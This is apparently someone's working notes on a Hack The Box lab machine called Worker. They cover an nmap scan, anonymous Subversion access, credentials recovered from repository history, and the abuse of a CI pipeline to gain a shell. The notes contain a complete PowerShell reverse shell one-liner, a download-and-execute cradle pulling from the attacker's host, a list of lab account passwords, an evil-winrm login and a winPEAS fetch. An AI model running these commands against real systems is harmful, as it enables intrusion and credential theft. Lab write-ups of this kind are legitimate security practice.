@@ -1,0 +1,104 @@
+Nmap scan shows two open ports
+
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+Making a directory enumaration on port 80
+
+-- Researching svnserve 
+
+Connecting to the svn server using SmartSVN, anonymous access is granted
+
+A iam able to download a project website based on Dimension by 5Up
+A page contains several "domains" that need to be added to my /etc/hosts
+The subdomains did not yeild anything intresting
+Fuzzing for more subdomains that could exist
+
+
+Found another subdomain
+http://devops.worker.htb
+
+Found in Subversion revision 2 in deploy.ps1
+$user = "nathen" 
+$plain = "wendel98"
+
+My user has the power to create a new pull request for the spectral project
+to add data to the repo that are pushed online through the pipeline.
+We will use that to upload a reverse shell online
+
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.70',1818);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush() };$client.Close()"
+
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.46:8000/rs.ps1')
+
+initial dir = C:\windows\system32\inetsrv
+we are in as iis
+
+
+
+
+if we move to W:// we can see azure related data as well as the sites
+lets look into it
+
+
+found a bunch of passwords user pairs in W:\svnrepos\www\conf
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+
+
+I can connect as robisl with evil-winrm
+evil-winrm -i 10.10.10.203 -u robisl -p wolves11
+robisl = wolves11
+
+
+
+I can log in as robisl to the devops.
+Then i can create my own pipeline in which i command is executed as root
+set up a listener to upload and execute my shell
+wget http://10.10.14.70:8000/winPEAS.exe -OutFile winPEAS.exe
+
+
